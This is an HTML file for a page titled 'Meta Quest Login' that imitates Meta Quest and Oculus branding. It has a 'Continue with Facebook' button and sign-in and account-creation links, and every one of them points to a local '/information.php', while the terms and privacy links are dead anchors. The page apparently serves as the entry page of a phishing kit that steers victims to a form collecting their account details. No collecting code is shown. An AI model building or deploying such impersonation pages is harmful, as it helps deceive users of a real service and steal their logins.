<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meta Quest Login</title>
    <link rel="icon" href="/images/favicon.ico">
    <link rel="stylesheet" href="/styles/style.css">
</head>

<body class="metaquest-bg">
    <header class="metaquest-header">
        <div class="metaquest-header-inner">
            <div class="metaquest-logo">
                <img src="/images/logo.png" alt="Meta Quest" height="28">
                <span class="metaquest-title">Meta Quest</span>
            </div>
            <div class="metaquest-user-icon">
                <svg width="24" height="24" fill="none" stroke="#222" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 8-4 8-4s8 0 8 4"/></svg>
            </div>
        </div>
    </header>
    <main class="metaquest-main">
        <div class="metaquest-login-box">
            <div class="metaquest-oculus-logo">
                <svg width="150" height="114" viewBox="0 0 80 44" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <rect x="5" y="0" width="70" height="45" rx="20" fill="#fff"/>
                    <rect x="20" y="15" width="40" height="15" rx="8" fill="#181818"/>
                </svg>
            </div>
            <button class="metaquest-fb-btn" onclick="window.location.href='/information.php'">Continue with Facebook</button>
            <a class="metaquest-link" href="/information.php">Not you?</a>
            <div class="metaquest-login-links">
                <div class="metaquest-small"><a href="/information.php" class="metaquest-link">Sign In</a> or <a href="/information.php"  class="metaquest-link">Create new account</a></div>
                <div class="metaquest-small">By creating an account, you agree to the<br><a href="#" class="metaquest-link">Oculus Terms of Service</a></div>
                <div class="metaquest-small">Learn more about how we collect, use and share your data in our<br><a href="#" class="metaquest-link">Privacy Policy</a></div>
            </div>
        </div>
    </main>
    <script src="/scripts/script.js"></script>
</body>

</html>